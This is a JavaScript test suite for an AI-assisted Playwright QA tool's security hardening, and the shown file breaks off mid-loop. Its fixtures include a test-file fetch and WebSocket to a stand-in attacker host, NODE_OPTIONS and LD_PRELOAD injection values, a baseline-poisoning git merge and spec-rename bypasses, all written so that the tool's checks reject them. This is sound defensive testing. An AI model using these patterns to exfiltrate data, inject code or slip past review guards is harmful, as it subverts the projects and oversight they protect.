import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { createEphemeralFulcioCa } from '../../bench/agentic/lib/t2-ca.mjs';
import { runCli } from '../../src/cli.mjs';
import { acquireDiskLock } from '../../src/core/disk-lock.mjs';
import { flattenPlaywrightResults } from '../../src/core/playwright-results.mjs';
import { redactSecrets, redactStructuredValue } from '../../src/core/redact.mjs';
import { loadRuntimeConfig, validateRuntimeConfig } from '../../src/core/runtime-config.mjs';
import { correlateFailureWithFrontendDiff } from '../../src/diagnose/diff-correlator.mjs';
import { generateDiagnosticsMarkdown } from '../../src/diagnose.mjs';
import { attachExploreObservers } from '../../src/explore/observers.mjs';
import { runExploreCommand } from '../../src/explore.mjs';
import { runGovernanceCommand } from '../../src/governance.mjs';
import { runInit } from '../../src/init.mjs';
import { buildSafeChildEnv } from '../../src/jobs/workspace-lock.mjs';
import {
  resolveValidatedWorkspaceBaselineRef,
  validateGitBaselineRef,
  writeSignedBaselineRef,
} from '../../src/kernel/gate/baseline-ref.mjs';
import { runGitDiffGuard } from '../../src/kernel/gate/changeset.mjs';
import { isProtectedDiffPath, verifyGovernanceLockInQaDir } from '../../src/kernel/gate/policy.mjs';
import { scanSpecFilesFallback } from '../../src/kernel/gate/static-runner.mjs';
import { openTrustContext } from '../../src/kernel/gate/trust-context.mjs';
import { signPayloadT1, verifyPayloadT1 } from '../../src/kernel/gate/trust-hmac.mjs';
import { handleMcpJsonRpcMessage } from '../../src/mcp/protocol.mjs';
import { isAllowedHttpOrigin } from '../../src/mcp/security.mjs';
import { createMcpHttpServer } from '../../src/mcp/transport-http.mjs';
import { runPerfCommand } from '../../src/perf.mjs';
import { buildPlaywrightChildEnv } from '../../src/runner.mjs';
import { buildInTotoVerdictAttestation, verifyAttestationFile } from '../../src/trust.mjs';
import { upgradeQaWorkspace } from '../../src/upgrade.mjs';

/**
 * Helper to create an isolated Git repository with a baseline commit and a feature branch diff.
 */
function runGit(cwd, args) {
  return execFileSync('git', ['-c', 'core.quotePath=off', ...args], {
    cwd,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  }).trim();
}

function makeTempKeyEnv(dir, fillChar = 'a') {
  const keyFile = path.join(dir, `t1-key-${fillChar}.hex`);
  fs.writeFileSync(keyFile, `${fillChar.repeat(64)}\n`, { encoding: 'utf8', mode: 0o600 });
  return {
    keyFile,
    env: {
      ...process.env,
      AITEST_HMAC_KEY: undefined,
      AITEST_HMAC_KEY_FILE: keyFile,
      CI: undefined,
      GITHUB_ACTIONS: undefined,
    },
  };
}

function evalSingleSpecDiff(baseCode, headCode, options = {}) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-ast-'));
  try {
    const repoDir = path.join(tmpDir, 'repo');
    const qaDir = path.join(repoDir, 'qa');
    const relSpec = options.relPath || 'qa/tests/e2e/sample.spec.ts';
    const fullSpec = path.join(repoDir, relSpec);
    fs.mkdirSync(path.dirname(fullSpec), { recursive: true });
    fs.mkdirSync(path.join(qaDir, 'tests', 'fixtures'), { recursive: true });
    fs.writeFileSync(path.join(qaDir, 'tests', 'fixtures', 'base.ts'), 'export { test, expect } from "@playwright/test";\n', 'utf8');
    fs.writeFileSync(
      path.join(qaDir, 'playwright.config.ts'),
      fs.readFileSync(path.resolve('templates/playwright-qa/playwright.config.ts'), 'utf8'),
      'utf8'
    );
    fs.writeFileSync(path.join(qaDir, 'aitest.config.json'), JSON.stringify({ schemaVersion: 1, assertFunctionNames: ['expect*', 'assert*', 'verify*'] }), 'utf8');
    fs.writeFileSync(fullSpec, baseCode, 'utf8');
    if (options.extraBaseFiles) {
      for (const [rp, content] of Object.entries(options.extraBaseFiles)) {
        const fp = path.join(repoDir, rp);
        fs.mkdirSync(path.dirname(fp), { recursive: true });
        fs.writeFileSync(fp, content, 'utf8');
      }
    }
    runGit(repoDir, ['init', '-b', 'main']);
    runGit(repoDir, ['config', 'user.email', 'test@example.com']);
    runGit(repoDir, ['config', 'user.name', 'Test User']);
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-m', 'chore: base']);
    const baseSha = runGit(repoDir, ['rev-parse', 'HEAD']);

    if (headCode === null) {
      fs.rmSync(fullSpec, { force: true });
    } else {
      fs.writeFileSync(fullSpec, headCode, 'utf8');
    }
    if (options.extraHeadFiles) {
      for (const [rp, content] of Object.entries(options.extraHeadFiles)) {
        const fp = path.join(repoDir, rp);
        if (content === null) {
          fs.rmSync(fp, { force: true });
        } else {
          fs.mkdirSync(path.dirname(fp), { recursive: true });
          fs.writeFileSync(fp, content, 'utf8');
        }
      }
    }
    if (options.afterSetup) {
      options.afterSetup(repoDir, qaDir);
    }

    const res = runGitDiffGuard(qaDir, baseSha, {
      ...(options.evalOpts || {}),
    });
    return { ...res, errors: res.violations || [] };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

async function withSuppressedConsoleAndCapture(fn) {
  const logs = [];
  const errs = [];
  const origLog = console.log;
  const origErr = console.error;
  const origWarn = console.warn;
  console.log = (...a) => logs.push(a.join(' '));
  console.error = (...a) => errs.push(a.join(' '));
  console.warn = () => {};
  try {
    const res = await fn();
    return { res, logs, errs };
  } finally {
    console.log = origLog;
    console.error = origErr;
    console.warn = origWarn;
  }
}

// ============================================================================
// WU-A: Idempotent init / no-op upgrade governance preservation & atomic disk lock
// ============================================================================
test('v6.2.1 Hardening (WU-A): idempotent init & no-op upgrade preserve template-manifest updatedAt and governance.lock; acquireDiskLock creates missing .aitest/', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-wua-'));
  const prevKeyFile = process.env.AITEST_HMAC_KEY_FILE;
  const prevKey = process.env.AITEST_HMAC_KEY;
  try {
    const keyFile = path.join(tmpDir, 'host-t1.key');
    fs.writeFileSync(keyFile, `${'b'.repeat(64)}\n`, 'utf8');
    delete process.env.AITEST_HMAC_KEY;
    process.env.AITEST_HMAC_KEY_FILE = keyFile;

    // 1. acquireDiskLock succeeds atomically even when .aitest/ does not exist yet
    const freshQa = path.join(tmpDir, 'fresh-qa');
    fs.mkdirSync(freshQa, { recursive: true });
    const lock1 = await acquireDiskLock(freshQa, 2000);
    assert.equal(lock1.ok, true);
    assert.equal(fs.existsSync(path.join(freshQa, '.aitest', '.write.lock')), true);
    lock1.release();
    assert.equal(fs.existsSync(path.join(freshQa, '.aitest', '.write.lock')), false);

    // 2. Idempotent init + no-op upgrade preserve .aitest/template-manifest.json & governance.lock
    const repoDir = path.join(tmpDir, 'repo');
    fs.mkdirSync(repoDir, { recursive: true });
    await withSuppressedConsoleAndCapture(() =>
      runInit({ name: 'wua-demo', target: repoDir, skipInstall: true, loop: 'none' })
    );
    const qaDir = path.join(repoDir, 'qa');
    const manifestPath = path.join(qaDir, '.aitest', 'template-manifest.json');
    const beforeManifestRaw = fs.readFileSync(manifestPath, 'utf8');
    const beforeUpdatedAt = JSON.parse(beforeManifestRaw).updatedAt;

    await new Promise((r) => setTimeout(r, 25));

    // Re-running init idempotently must NOT rewrite template-manifest.json or break governance.lock
    await withSuppressedConsoleAndCapture(() =>
      runInit({ name: 'wua-demo', target: repoDir, skipInstall: true, loop: 'none' })
    );
    assert.equal(JSON.parse(fs.readFileSync(manifestPath, 'utf8')).updatedAt, beforeUpdatedAt);
    assert.equal(verifyGovernanceLockInQaDir(qaDir).ok, true);

    await new Promise((r) => setTimeout(r, 25));

    // No-op upgrade must NOT rewrite template-manifest.json or self-destruct governance.lock
    const upRes = upgradeQaWorkspace(qaDir, { dryRun: false });
    assert.equal(upRes.ok, true);
    assert.equal(JSON.parse(fs.readFileSync(manifestPath, 'utf8')).updatedAt, beforeUpdatedAt);
    const lockCheck = verifyGovernanceLockInQaDir(qaDir);
    assert.equal(lockCheck.ok, true, lockCheck.errors.join('\n'));
  } finally {
    if (prevKeyFile === undefined) delete process.env.AITEST_HMAC_KEY_FILE;
    else process.env.AITEST_HMAC_KEY_FILE = prevKeyFile;
    if (prevKey === undefined) delete process.env.AITEST_HMAC_KEY;
    else process.env.AITEST_HMAC_KEY = prevKey;
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// WU-B: Sticky-T1 foreign keyId rejection, governance approve, verifier, env allowlist
// ============================================================================
test('v6.2.1 Hardening (WU-B): sticky-T1 rejects foreign keyId on local runtime domains & locally-signed lock; caps cross-machine lock at T0; blocks CI/Agent governance approve; allowlists child env', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-wub-'));
  try {
    const repoDir = path.join(tmpDir, 'repo');
    const qaDir = path.join(repoDir, 'qa');
    fs.mkdirSync(path.join(qaDir, '.aitest'), { recursive: true });

    const hostA = makeTempKeyEnv(tmpDir, 'a');
    const hostB = makeTempKeyEnv(tmpDir, 'b');
    const ctxA = openTrustContext({ qaDir, repoDir, env: hostA.env });
    const ctxB = openTrustContext({ qaDir, repoDir, env: hostB.env });
    assert.equal(ctxA.hostT1Sticky, true);
    assert.notEqual(ctxA.keyId, ctxB.keyId);

    // 1. All 5 local-only runtime domains MUST reject foreign keyId MAC (fail-closed)
    for (const domain of ['ledger.manifest', 'heal.session', 'heal.ledger', 'quarantine.json', 'workspace.baseline']) {
      const payload = { sample: domain, count: 1 };
      const foreignSig = signPayloadT1(domain, payload, { qaDir, repoDir, trustContext: ctxB, env: hostB.env });
      const check = verifyPayloadT1(domain, { ...payload, macKeyId: foreignSig.keyId }, foreignSig.mac, {
        qaDir,
        repoDir,
        trustContext: ctxA,
        env: hostA.env,
      });
      assert.equal(check.ok, false, `Local runtime domain ${domain} MUST fail-closed on foreign keyId`);
    }

    // 2. Cross-machine governance.lock (never signed by Host A) allows foreign verify capped at T0,
    //    whereas a lock bound to Host A via sticky record rejects foreign keyId tamper.
    const prevKeyFile = process.env.AITEST_HMAC_KEY_FILE;
    const prevKey = process.env.AITEST_HMAC_KEY;
    try {
      delete process.env.AITEST_HMAC_KEY;
      process.env.AITEST_HMAC_KEY_FILE = hostB.keyFile;
      await withSuppressedConsoleAndCapture(() =>
        runInit({ name: 'wub-demo', target: repoDir, skipInstall: true, loop: 'none' })
      );
      // Simulate fresh clone to Host A by removing gitignored .aitest/t1-sticky.json
      const stickyPath = path.join(qaDir, '.aitest', 't1-sticky.json');
      if (fs.existsSync(stickyPath)) fs.rmSync(stickyPath, { force: true });

      process.env.AITEST_HMAC_KEY_FILE = hostA.keyFile;
      const crossMachine = verifyGovernanceLockInQaDir(qaDir, { trustContext: ctxA });
      assert.equal(crossMachine.ok, true);
      assert.equal(crossMachine.trustTier, 'T0', 'Foreign cross-machine governance.lock must cap trustTier at T0');

      // Now bind Host A sticky record and verify Host B-only lock is rejected fail-closed!
      fs.writeFileSync(
        stickyPath,
        JSON.stringify({ schemaVersion: 1, keyIds: [ctxA.keyId], updatedAt: new Date().toISOString() }),
        'utf8'
      );
      const localTamper = verifyGovernanceLockInQaDir(qaDir, { trustContext: ctxA });
      assert.equal(localTamper.ok, false, 'Locally-bound workspace lock missing local Host A MAC must fail-closed');
    } finally {
      if (prevKeyFile === undefined) delete process.env.AITEST_HMAC_KEY_FILE;
      else process.env.AITEST_HMAC_KEY_FILE = prevKeyFile;
      if (prevKey === undefined) delete process.env.AITEST_HMAC_KEY;
      else process.env.AITEST_HMAC_KEY = prevKey;
    }

    // 3. governance approve blocks CI=1 and Agent env markers (CLAUDECODE, ANTIGRAVITY_CONVERSATION_ID)
    const savedEnv = {
      CI: process.env.CI,
      CLAUDECODE: process.env.CLAUDECODE,
      ANTIGRAVITY_CONVERSATION_ID: process.env.ANTIGRAVITY_CONVERSATION_ID,
      AITEST_APPROVE_NON_INTERACTIVE: process.env.AITEST_APPROVE_NON_INTERACTIVE,
    };
    try {
      delete process.env.AITEST_APPROVE_NON_INTERACTIVE;
      delete process.env.CLAUDECODE;
      delete process.env.ANTIGRAVITY_CONVERSATION_ID;
      process.env.CI = '1';
      const ciCode = (
        await withSuppressedConsoleAndCapture(() =>
          runGovernanceCommand({ action: 'approve', target: repoDir, by: 'alice@team', reason: 'ci attempt', yes: true, json: true, isTTY: false })
        )
      ).res;
      assert.equal(ciCode, 2, 'CI=1 must NOT allow non-interactive governance approve');

      delete process.env.CI;
      process.env.AITEST_APPROVE_NON_INTERACTIVE = '1';
      process.env.CLAUDECODE = '1';
      const claudeCode = (
        await withSuppressedConsoleAndCapture(() =>
          runGovernanceCommand({ action: 'approve', target: repoDir, by: 'alice@team', reason: 'claude attempt', yes: true, json: true, isTTY: false })
        )
      ).res;
      assert.equal(claudeCode, 2, 'CLAUDECODE=1 must block governance approve even with AITEST_APPROVE_NON_INTERACTIVE=1');

      delete process.env.CLAUDECODE;
      process.env.ANTIGRAVITY_CONVERSATION_ID = 'conv-123';
      const agCode = (
        await withSuppressedConsoleAndCapture(() =>
          runGovernanceCommand({ action: 'approve', target: repoDir, by: 'alice@team', reason: 'ag attempt', yes: true, json: true, isTTY: false })
        )
      ).res;
      assert.equal(agCode, 2, 'ANTIGRAVITY_CONVERSATION_ID must block governance approve');
    } finally {
      for (const [k, v] of Object.entries(savedEnv)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
    }

    // 4. verifyAttestationFile rejects in-workspace AITEST_HMAC_KEY_FILE & short/non-hex expectGitSha
    const inWorkspaceKey = path.join(qaDir, 'evil.key');
    fs.writeFileSync(inWorkspaceKey, `${'c'.repeat(64)}\n`, 'utf8');
    const attPath = path.join(qaDir, 'reports', 'attestation.json');
    fs.mkdirSync(path.dirname(attPath), { recursive: true });
    const stmt = buildInTotoVerdictAttestation({
      qaDir,
      repoDir,
      verdictPayload: {
        gitSha: '0123456789abcdef0123456789abcdef01234567',
        verdict: 'pass',
        trustTier: 'T1',
        trustLevel: 'T1',
        runId: '01TESTWUB00000000000000000',
        gates: { governance: 'pass', static: 'pass', runtime: 'pass', semanticDiff: 'pass' },
      },
      trustContext: ctxA,
    });
    fs.writeFileSync(attPath, JSON.stringify(stmt, null, 2), 'utf8');

    const badKeyRes = verifyAttestationFile(attPath, {
      qaDir,
      repoDir,
      env: { ...process.env, AITEST_HMAC_KEY_FILE: inWorkspaceKey, AITEST_HMAC_KEY: undefined },
    });
    assert.equal(badKeyRes.ok, false);
    assert.match(badKeyRes.errors.join('\n'), /inside workspace|HMAC_KEY_FILE|invalid/i);

    const shortShaRes = verifyAttestationFile(attPath, {
      qaDir,
      repoDir,
      expectGitSha: '012345',
      env: hostA.env,
    });
    assert.equal(shortShaRes.ok, false);
    assert.match(shortShaRes.errors.join('\n'), /40-character|hex/i);

    // 5. buildSafeChildEnv & buildPlaywrightChildEnv allowlisting + proxy credential stripping
    const dirtyEnv = {
      PATH: '/usr/bin',
      TEST_BASE_URL: 'http://127.0.0.1:3000',
      E2E_USERNAME: 'qa_user',
      E2E_PASSWORD: 'qa-only-password',
      DB_PASSWORD: 'prod-db-password',
      AITEST_HMAC_KEY: 'deadbeef'.repeat(8),
      AITEST_HMAC_KEY_FILE: hostA.keyFile,
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'oidc-secret',
      ACTIONS_RUNTIME_TOKEN: 'runtime-secret',
      DATABASE_URL: 'postgres://admin:pw@db/prod',
      STRIPE_SECRET_KEY: 'sk_live_123',
      AWS_SECRET_ACCESS_KEY: 'aws-secret',
      MY_API_KEY: 'apikey-123',
      HTTP_PROXY: 'http://alice:supersecret@proxy.local:8080/path',
      HTTPS_PROXY: 'https://bob:pass@proxy.local:8443',
      RANDOM_UNLISTED_VAR: 'should-drop',
    };
    const safeMcpChild = buildSafeChildEnv(dirtyEnv);
    assert.equal(safeMcpChild.AITEST_HMAC_KEY, undefined);
    assert.equal(safeMcpChild.ACTIONS_ID_TOKEN_REQUEST_TOKEN, undefined);
    assert.equal(safeMcpChild.ACTIONS_RUNTIME_TOKEN, undefined);
    assert.equal(safeMcpChild.DATABASE_URL, undefined);
    assert.equal(safeMcpChild.STRIPE_SECRET_KEY, undefined);
    assert.equal(safeMcpChild.MY_API_KEY, undefined);
    assert.equal(safeMcpChild.RANDOM_UNLISTED_VAR, undefined);
    assert.equal(safeMcpChild.AITEST_HMAC_KEY_FILE, hostA.keyFile);
    assert.equal(safeMcpChild.E2E_PASSWORD, 'qa-only-password');
    assert.equal(safeMcpChild.DB_PASSWORD, undefined);
    assert.equal(safeMcpChild.HTTP_PROXY?.includes('supersecret'), false);
    assert.equal(safeMcpChild.HTTPS_PROXY?.includes('pass'), false);

    const safePwChild = buildPlaywrightChildEnv(dirtyEnv);
    assert.equal(safePwChild.AITEST_HMAC_KEY_FILE, undefined, 'Playwright child MUST NOT receive AITEST_HMAC_KEY_FILE');
    assert.equal(safePwChild.AITEST_HMAC_KEY, undefined);
    assert.equal(safePwChild.ACTIONS_ID_TOKEN_REQUEST_TOKEN, undefined);
    assert.equal(safePwChild.DATABASE_URL, undefined);
    assert.equal(safePwChild.DB_PASSWORD, undefined);
    assert.equal(safePwChild.E2E_PASSWORD, 'qa-only-password');
    assert.equal(safePwChild.TEST_BASE_URL, 'http://127.0.0.1:3000');
    assert.equal(safePwChild.HTTP_PROXY?.includes('supersecret'), false);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// WU-C: Signed .aitest/baseline-ref, empty-tree/-s ours/CI ignore, empty spec, @scaffold, G-08 rename
// ============================================================================
test('v6.2.1 Hardening (WU-C): signed .aitest/baseline-ref blocks empty-tree/ours/CI/explicitBase/unsigned; empty spec rejected; @scaffold replacement; G-08 rename blocked', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-wuc-'));
  try {
    // 1. gitignore & isProtectedDiffPath protection
    const gitignoreText = fs.readFileSync(path.resolve('templates/playwright-qa/gitignore'), 'utf8');
    assert.match(gitignoreText, /\.aitest\/baseline-ref/);
    assert.equal(isProtectedDiffPath('qa/.aitest/baseline-ref'), true);
    assert.equal(isProtectedDiffPath('.aitest/baseline-ref'), true);

    // 2. Git repo with main + feature branch + empty-tree -s ours poison
    const repoDir = path.join(tmpDir, 'repo');
    const qaDir = path.join(repoDir, 'qa');
    fs.mkdirSync(path.join(qaDir, '.aitest'), { recursive: true });
    fs.writeFileSync(path.join(repoDir, 'README.md'), '# demo\n', 'utf8');
    runGit(repoDir, ['init', '-b', 'main']);
    runGit(repoDir, ['config', 'user.email', 'test@example.com']);
    runGit(repoDir, ['config', 'user.name', 'Test User']);
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-m', 'chore: initial']);
    const firstCommit = runGit(repoDir, ['rev-parse', 'HEAD']);

    fs.writeFileSync(path.join(repoDir, 'README.md'), '# demo v2\n', 'utf8');
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-m', 'chore: second on main']);
    const mainSha = runGit(repoDir, ['rev-parse', 'HEAD']);

    runGit(repoDir, ['checkout', '-b', 'feat/work']);
    const emptyTreeSha = '4b825dc642cb6eb9a060e54bf8d69288fbee4904';
    const fakeEmptySha = runGit(repoDir, ['commit-tree', emptyTreeSha, '-m', 'empty root']);
    runGit(repoDir, ['merge', '--allow-unrelated-histories', '-s', 'ours', '--no-edit', fakeEmptySha]);

    const { env } = makeTempKeyEnv(tmpDir, 'c');
    const ctx = openTrustContext({ qaDir, repoDir, env });

    // Valid mainSha passes validateGitBaselineRef
    assert.equal(validateGitBaselineRef(repoDir, mainSha, env).ok, true);
    // Empty-tree commit fails
    assert.equal(validateGitBaselineRef(repoDir, fakeEmptySha, env).ok, false);
    // Commit predating merge-base(HEAD, main) fails
    assert.equal(validateGitBaselineRef(repoDir, firstCommit, env).ok, false);

    // Signed baseline-ref succeeds locally, ignored under CI=1 and explicitBase=true
    writeSignedBaselineRef(qaDir, { baselineRef: mainSha, strategy: 'main', repoDir, trustContext: ctx, env });
    const localOk = resolveValidatedWorkspaceBaselineRef(qaDir, repoDir, { trustContext: ctx, env });
    assert.equal(localOk.blocked, false);
    assert.equal(localOk.ref, mainSha);

    const ciIgnored = resolveValidatedWorkspaceBaselineRef(qaDir, repoDir, {
      trustContext: ctx,
      env: { ...env, CI: 'true' },
    });
    assert.equal(ciIgnored.ref, null);
    assert.equal(ciIgnored.blocked, false);

    const explicitIgnored = resolveValidatedWorkspaceBaselineRef(qaDir, repoDir, {
      explicitBase: true,
      trustContext: ctx,
      env,
    });
    assert.equal(explicitIgnored.ref, null);

    // Unsigned raw legacy baseline-ref is blocked on sticky-T1 host
    fs.writeFileSync(path.join(qaDir, '.aitest', 'baseline-ref'), `${mainSha}\n`, 'utf8');
    const unsignedBlocked = resolveValidatedWorkspaceBaselineRef(qaDir, repoDir, { trustContext: ctx, env });
    assert.equal(unsignedBlocked.blocked, true);

    // 3. Branch-new spec hollowed out to 0 test blocks MUST be rejected (meetsBranchNewAssertionFloor returns false)
    const draftBaseSpec = `import { test, expect } from '../fixtures/base';\ntest('[REQ-D1] draft @e2e', async ({ page }) => {\n  await expect(page.getByRole('heading')).toHaveText('Draft');\n});\n`;
    const hollowedBranchSpec = evalSingleSpecDiff(draftBaseSpec, `// all tests deleted\nexport {};\n`, {
      relPath: 'qa/tests/e2e/branch-new.spec.ts',
      afterSetup: (rDir) => {
        runGit(rDir, ['checkout', '-b', 'feat/hollow']);
        fs.writeFileSync(path.join(rDir, 'qa/tests/e2e/fresh.spec.ts'), draftBaseSpec, 'utf8');
        runGit(rDir, ['add', 'qa/tests/e2e/fresh.spec.ts']);
        runGit(rDir, ['commit', '-m', 'wip: add fresh spec']);
        fs.writeFileSync(path.join(rDir, 'qa/tests/e2e/fresh.spec.ts'), '// emptied\nexport {};\n', 'utf8');
      },
      evalOpts: { baselineRef: 'main' },
    });
    assert.equal(hollowedBranchSpec.ok, false, 'Emptying a branch-new spec to 0 test blocks must be rejected');

    // 4. @scaffold home.spec.ts removal: blocked alone, allowed with real non-scaffold >= S2 spec
    const scaffoldSpec = `import { test, expect } from '../fixtures/base';\ntest('template @scaffold', async ({ page }) => {\n  await expect(page.getByRole('heading')).toHaveText('Welcome');\n});\n`;
    const realSpec = `import { test, expect } from '../fixtures/base';\ntest('[REQ-1] real flow @e2e', async ({ page }) => {\n  await page.goto('/app');\n  await expect(page.getByRole('heading')).toHaveText('Orders');\n});\n`;
    const delAlone = evalSingleSpecDiff(scaffoldSpec, null, { relPath: 'qa/tests/e2e/home.spec.ts' });
    assert.equal(delAlone.ok, false, 'Deleting @scaffold spec without adding a real spec must still block');

    const delWithReplacement = evalSingleSpecDiff(scaffoldSpec, null, {
      relPath: 'qa/tests/e2e/home.spec.ts',
      extraHeadFiles: { 'qa/tests/e2e/orders.spec.ts': realSpec },
    });
    assert.equal(delWithReplacement.ok, true, `Expected @scaffold replacement to pass, got: ${delWithReplacement.errors.join('\n')}`);

    // 5. G-08 rename bypasses (F44 .spec.ts.disabled, F45 .e2e.ts, F55 tests/legacy/*.spec.ts)
    const prodSpec = `import { test, expect } from '../fixtures/base';\ntest('[REQ-9] checkout @critical', async ({ page }) => {\n  await expect(page.getByTestId('total')).toHaveText('$10');\n});\n`;
    for (const targetRel of [
      'qa/tests/e2e/sample.spec.ts.disabled',
      'qa/tests/e2e/sample.e2e.ts',
      'qa/tests/legacy/sample.spec.ts',
    ]) {
      const mvRes = evalSingleSpecDiff(prodSpec, null, {
        extraHeadFiles: { [targetRel]: prodSpec },
      });
      assert.equal(mvRes.ok, false, `Renaming spec to ${targetRel} MUST be blocked by G-08`);
    }
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// WU-D: X.509/Fulcio OID, fixtures static checks, runtime env, redirect hops, MCP HTTP, Redaction v3
// ============================================================================
test('v6.2.1 Hardening (WU-D): X.509 CA/expiry/KeyUsage/Fulcio commit OID, fixtures static checks, runtime webServer.env, 10-hop redirect cutoff, MCP HTTP origin/cap, Redaction v3', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-wud-'));
  try {
    // 1. X.509 chain hardening
    const qaDir = path.join(tmpDir, 'qa');
    fs.mkdirSync(qaDir, { recursive: true });
    const attPath = path.join(qaDir, 'attestation.json');
    const commitGood = '1111111111111111111111111111111111111111';
    const commitBad = '2222222222222222222222222222222222222222';
    const stmt = buildInTotoVerdictAttestation({
      qaDir,
      repoDir: tmpDir,
      verdictPayload: {
        gitSha: commitGood,
        verdict: 'pass',
        trustTier: 'T1',
        trustLevel: 'T1',
        runId: '01TESTWUD00000000000000000',
        gates: { governance: 'pass', static: 'pass', runtime: 'pass', semanticDiff: 'pass' },
      },
    });
    fs.writeFileSync(attPath, JSON.stringify(stmt, null, 2), 'utf8');

    const goodCa = createEphemeralFulcioCa('Good Root CA');
    const expiredBundle = path.join(qaDir, 'expired.sigstore.json');
    goodCa.signAttestationFile(attPath, {
      commitSha: commitGood,
      notBefore: new Date(Date.now() - 3600_000),
      notAfter: new Date(Date.now() - 60_000),
      bundleOutPath: expiredBundle,
    });
    const expRes = verifyAttestationFile(attPath, {
      bundlePath: expiredBundle,
      expectRepo: 'seaworld008/ai-test-workbench',
      expectWorkflow: '.github/workflows/aitest-verify.yml',
      expectRef: 'refs/heads/main',
      expectGitSha: commitGood,
      trustedRootCertPem: goodCa.rootCertPem,
    });
    assert.equal(expRes.ok, false, 'Expired leaf cert must be rejected');

    const nonCaRoot = createEphemeralFulcioCa('Non-CA Root', { rootCa: false });
    const nonCaBundle = path.join(qaDir, 'nonca.sigstore.json');
    nonCaRoot.signAttestationFile(attPath, { commitSha: commitGood, bundleOutPath: nonCaBundle });
    const nonCaRes = verifyAttestationFile(attPath, {
      bundlePath: nonCaBundle,
      expectRepo: 'seaworld008/ai-test-workbench',
      expectWorkflow: '.github/workflows/aitest-verify.yml',
      expectRef: 'refs/heads/main',
      expectGitSha: commitGood,
      trustedRootCertPem: nonCaRoot.rootCertPem,
    });
    assert.equal(nonCaRes.ok, false, 'Root with BasicConstraints CA:FALSE must be rejected');

    const noDigSigBundle = path.join(qaDir, 'nodigsig.sigstore.json');
    goodCa.signAttestationFile(attPath, {
      commitSha: commitGood,
      leafKeyUsageByte: 0x04, // keyCertSign only, no digitalSignature
      leafKeyUsageUnusedBits: 2,
      bundleOutPath: noDigSigBundle,
    });
    const noDigSigRes = verifyAttestationFile(attPath, {
      bundlePath: noDigSigBundle,
      expectRepo: 'seaworld008/ai-test-workbench',
      expectWorkflow: '.github/workflows/aitest-verify.yml',
      expectRef: 'refs/heads/main',
      expectGitSha: commitGood,
      trustedRootCertPem: goodCa.rootCertPem,
    });
    assert.equal(noDigSigRes.ok, false, 'Leaf cert without digitalSignature KeyUsage must be rejected');

    const wrongCommitBundle = path.join(qaDir, 'wrongcommit.sigstore.json');
    goodCa.signAttestationFile(attPath, { commitSha: commitBad, bundleOutPath: wrongCommitBundle });
    const wrongCommitRes = verifyAttestationFile(attPath, {
      bundlePath: wrongCommitBundle,
      expectRepo: 'seaworld008/ai-test-workbench',
      expectWorkflow: '.github/workflows/aitest-verify.yml',
      expectRef: 'refs/heads/main',
      expectGitSha: commitGood,
      trustedRootCertPem: goodCa.rootCertPem,
    });
    assert.equal(wrongCommitRes.ok, false, 'Mismatched Fulcio commit SHA OID must be rejected');

    // 2. static-runner blocks fetch / WebSocket / dynamic import / expect.extend / direct @playwright/test inside tests/fixtures/custom/evil.ts
    const testsDir = path.join(qaDir, 'tests');
    fs.mkdirSync(path.join(testsDir, 'fixtures', 'custom'), { recursive: true });
    fs.writeFileSync(path.join(testsDir, 'fixtures', 'base.ts'), 'export { test, expect } from "@playwright/test";\n', 'utf8');
    fs.writeFileSync(
      path.join(testsDir, 'fixtures', 'custom', 'evil.ts'),
      `import { test, expect } from '@playwright/test';
export async function leak() {
  await globalThis.fetch('https://evil.example');
  const ws = new WebSocket('wss://evil.example');
  const mod = await import('node:child_process');
  expect.extend({ toAlwaysPass: () => ({ pass: true, message: () => '' }) });
  return { ws, mod, test };
}
`,
      'utf8'
    );
    const staticRes = scanSpecFilesFallback(testsDir, { qaDir });
    assert.equal(staticRes.ok, false);
    assert.ok(staticRes.errors.some((e) => e.includes('@playwright/test')));
    assert.ok(staticRes.errors.some((e) => e.includes('global fetch')));
    assert.ok(staticRes.errors.some((e) => e.includes('WebSocket')));
    assert.ok(staticRes.errors.some((e) => e.includes('expect.extend')));

    // 3. validateRuntimeConfig rejects NODE_OPTIONS & LD_PRELOAD in webServer.env
    const badRt = validateRuntimeConfig({
      schemaVersion: 1,
      baseURL: 'http://127.0.0.1:3000',
      webServer: {
        command: 'npm run dev',
        url: 'http://127.0.0.1:3000',
        env: { NODE_OPTIONS: '--require /tmp/evil.js', LD_PRELOAD: '/tmp/evil.so' },
      },
    });
    assert.equal(badRt.ok, false);
    assert.ok(badRt.errors.some((e) => e.includes('NODE_OPTIONS')));
    assert.ok(badRt.errors.some((e) => e.includes('LD_PRELOAD')));

    // 4. Explore redirectHopTracker cuts off > 10 hops even when req.redirectedFrom() is null
    let routeHandler = null;
    const mockContext = {
      route: async (_pat, fn) => {
        routeHandler = fn;
      },
      addInitScript: async () => {},
      newPage: async () => ({ on: () => {} }),
    };
    const topology = { blockedWriteRequests: [], endpoints: [] };
    await attachExploreObservers({
      context: mockContext,
      safety: { baseURL: 'http://127.0.0.1:3000' },
      guardConfig: {
        baseURL: 'http://127.0.0.1:3000',
        allowedHosts: ['127.0.0.1'],
        deniedOrigins: [],
        blockedEndpoints: [],
        allowMutation: false,
      },
      sessionData: null,
      topology,
      entryPath: '/',
    });
    assert.ok(routeHandler);
    let aborted = 0;
    for (let hop = 0; hop <= 11; hop += 1) {
